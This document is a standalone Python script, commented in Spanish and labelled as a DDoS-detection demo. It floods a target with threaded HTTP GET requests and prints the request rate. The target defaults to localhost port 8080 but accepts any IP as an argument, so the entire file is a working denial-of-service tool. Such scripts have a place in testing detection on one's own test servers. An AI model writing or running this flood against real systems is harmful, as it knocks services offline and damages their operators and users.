#!/usr/bin/env python3
"""
http_flood.py — Ataque HTTP Flood para demostracion
====================================================
Genera trafico HTTP contra el servidor de prueba (puerto 8080).
Sin SSL, sin dependencias, solo stdlib.

Uso: python3 http_flood.py [target_ip] [hilos] [duracion]
"""
import sys
import time
import socket
import threading

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 8080
THREADS = int(sys.argv[2]) if len(sys.argv) > 2 else 200
DURATION = int(sys.argv[3]) if len(sys.argv) > 3 else 60

END_TIME = time.time() + DURATION
total_requests = 0
lock = threading.Lock()

URLS = [
    "/", "/index.html", "/?id=1", "/?search=test",
    "/wp-login.php", "/wp-admin/", "/api/v1/status",
    "/login", "/admin", "/dashboard",
]

class HTTPFlood(threading.Thread):
    def run(self):
        global total_requests
        end = END_TIME
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((TARGET, PORT))
                url = URLS[int(time.time() * 10) % len(URLS)]
                req = (
                    f"GET {url} HTTP/1.1\r\n"
                    f"Host: {TARGET}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                s.send(req.encode())
                try:
                    s.recv(1024)
                except:
                    pass
                s.close()
                with lock:
                    total_requests += 1
            except Exception:
                time.sleep(0.01)

print(f"\033[1;31m")
print(f"  {'=' * 50}")
print(f"  HTTP FLOOD — Demo DDoS Detection")
print(f"  {'=' * 50}")
print(f"\033[0m")
print(f"  Target:   {TARGET}:{PORT}")
print(f"  Hilos:    {THREADS}")
print(f"  Duracion: {DURATION}s")
print()

threads = []
for _ in range(THREADS):
    t = HTTPFlood()
    t.daemon = True
    t.start()
    threads.append(t)

start = time.time()
try:
    while time.time() - start < DURATION:
        elapsed = int(time.time() - start)
        with lock:
            current = total_requests
        rate = current // max(1, elapsed)
        sys.stdout.write(f"\r  [{elapsed:3}s] Requests: {current:6} | Rate: {rate:5} req/s")
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    pass

elapsed_total = int(time.time() - start)
print(f"\n\n  Finalizado.")
print(f"  Total requests: {total_requests}")
print(f"  Rate promedio:  {total_requests // max(1, elapsed_total)} req/s")
print()
